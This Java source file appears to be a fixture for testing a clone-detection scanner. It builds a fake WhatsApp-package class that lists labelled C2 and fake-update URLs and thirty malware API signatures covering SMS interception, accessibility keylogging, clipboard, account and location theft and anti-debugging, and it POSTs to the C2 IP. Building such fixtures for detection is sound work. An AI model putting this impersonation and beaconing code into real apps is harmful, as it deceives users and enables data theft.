package com.whatsapp;

import java.io.DataOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * Demo-only class. NEVER executed. Exists purely so compiled classes.dex
 * contains the string constants that Droid Sentinel's static analyzer scans for.
 * Building this APK is for security demonstration of clone-detection only.
 */
public class MainActivity {

    // C2 / exfiltration endpoints
    public static final String C2_PRIMARY      = "http://45.33.32.156:8080/upload";
    public static final String C2_SYNC         = "https://datacollect-api.xyz/v1/sync";
    public static final String FAKE_UPDATE     = "http://update.whatsapp-security.tk/check";
    public static final String LEGIT_BAIT      = "https://api.whatsapp.com/v1/messages";
    public static final String FONT_CDN        = "https://fonts.googleapis.com/css2";

    // Pattern tripwires — strings the scanner matches on
    private static final String T1 = "DexClassLoader";
    private static final String T2 = "loadClass";
    private static final String T3 = "dalvik.system.DexFile";
    private static final String T4 = "SmsMessage";
    private static final String T5 = "getMessageBody";
    private static final String T6 = "SMS_RECEIVED";
    private static final String T7 = "android.provider.Telephony.SMS";
    private static final String T8 = "AccessibilityService";
    private static final String T9 = "onAccessibilityEvent";
    private static final String T10 = "TYPE_VIEW_TEXT_CHANGED";
    private static final String T11 = "isDebuggerConnected";
    private static final String T12 = "android.os.Debug.isDebuggerConnected";
    private static final String T13 = "TracerPid";
    private static final String T14 = "Base64.decode";
    private static final String T15 = "new String(Base64";
    private static final String T16 = "HttpURLConnection";
    private static final String T17 = "ClipboardManager";
    private static final String T18 = "getPrimaryClip";
    private static final String T19 = "setPrimaryClip";
    private static final String T20 = "LocationManager";
    private static final String T21 = "getLastKnownLocation";
    private static final String T22 = "X509TrustManager";
    private static final String T23 = "checkClientTrusted";
    private static final String T24 = "SSLSocketFactory";
    private static final String T25 = "ContactsContract";
    private static final String T26 = "AccountManager.getAccounts";
    private static final String T27 = "getAllAccounts";
    private static final String T28 = "Runtime.exec";
    private static final String T29 = "ProcessBuilder";
    private static final String T30 = "System.loadLibrary";

    public static void main(String[] args) {
        // Dead code — string refs exist in the compiled dex regardless of execution.
        String[] refs = { T1, T2, T3, T4, T5, T6, T7, T8, T9, T10,
                          T11, T12, T13, T14, T15, T16, T17, T18, T19, T20,
                          T21, T22, T23, T24, T25, T26, T27, T28, T29, T30,
                          C2_PRIMARY, C2_SYNC, FAKE_UPDATE, LEGIT_BAIT, FONT_CDN };
        int sink = refs.length;
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(C2_PRIMARY).openConnection();
            c.setRequestMethod("POST");
            DataOutputStream out = new DataOutputStream(c.getOutputStream());
            out.writeBytes("id=" + sink);
            out.flush();
        } catch (Exception ignored) { }
    }
}
